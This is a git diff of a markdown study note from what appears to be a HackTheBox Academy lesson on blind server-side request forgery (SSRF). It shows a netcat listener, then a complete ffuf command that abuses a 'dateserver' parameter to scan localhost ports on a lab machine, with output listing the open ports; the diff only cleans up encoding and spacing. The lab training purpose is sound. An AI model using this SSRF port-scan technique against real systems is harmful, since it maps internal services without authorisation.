@@ -1,13 +1,13 @@
 ﻿---
 sticker: lucide//server
 ---
-In many real-world SSRF vulnerabilities, the response is not directly displayed to us. These instances are calledÂ `blind`Â SSRF vulnerabilities because we cannot see the response. As such, all of the exploitation vectors discussed in the previous sections are unavailable to us because they all rely on us being able to inspect the response. Therefore, the impact of blind SSRF vulnerabilities is generally significantly lower due to the severely restricted exploitation vectors.
+In many real-world SSRF vulnerabilities, the response is not directly displayed to us. These instances are called`blind` SSRF vulnerabilities because we cannot see the response. As such, all of the exploitation vectors discussed in the previous sections are unavailable to us because they all rely on us being able to inspect the response. Therefore, the impact of blind SSRF vulnerabilities is generally significantly lower due to the severely restricted exploitation vectors.
 
 ---
 
 ## Identifying Blind SSRF
 
-The sample web application behaves just like in the previous section. We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up aÂ `netcat`Â listener:
+The sample web application behaves just like in the previous section. We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up a`netcat` listener:
 
 ```shell-session
 smoothment@htb[/htb]$ nc -lnvp 8000
@@ -27,7 +27,7 @@ However, if we attempt to point the web application to itself, we can observe th
 
 ## Exploiting Blind SSRF
 
-Exploiting blind SSRF vulnerabilities is generally severely limited compared to non-blind SSRF vulnerabilities.Â However, depending on the web application's behavior, weÂ mightÂ stillÂ be able toÂ conduct a (restricted) localÂ port scanÂ of the system,Â provided the responseÂ differs for open and closed ports.Â In this case, the web application responds withÂ `Something went wrong!`Â for closed ports:
+Exploiting blind SSRF vulnerabilities is generally severely limited compared to non-blind SSRF vulnerabilities. However, depending on the web application's behavior, we might still be able to conduct a (restricted) local port scan of the system, provided the response differs for open and closed ports. In this case, the web application responds with`Something went wrong!` for closed ports:
 
 ![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_2.png)
 
@@ -79,31 +79,31 @@ Once we've fuzzed, we get the following:
 ```
 ffuf -w ports.txt:FUZZ -u http://10.129.70.117/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ&date=2024-01-01" -fr 'Something went wrong!' -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : POST
- :: URL              : http://10.129.70.117/index.php
- :: Wordlist         : FUZZ: /home/samsepiol/ports.txt
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Data             : dateserver=http://127.0.0.1:FUZZ&date=2024-01-01
+ :: Method : POST
+ :: URL : http://10.129.70.117/index.php
+ :: Wordlist : FUZZ: /home/samsepiol/ports.txt
+ :: Header : Content-Type: application/x-www-form-urlencoded
+ :: Data : dateserver=http://127.0.0.1:FUZZ&date=2024-01-01
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Regexp: Something went wrong!
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter : Regexp: Something went wrong!
 ________________________________________________
 
-5000                    [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 111ms]
-80                      [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 3977ms]
+5000 [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 111ms]
+80 [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 3977ms]
 ```
 
 
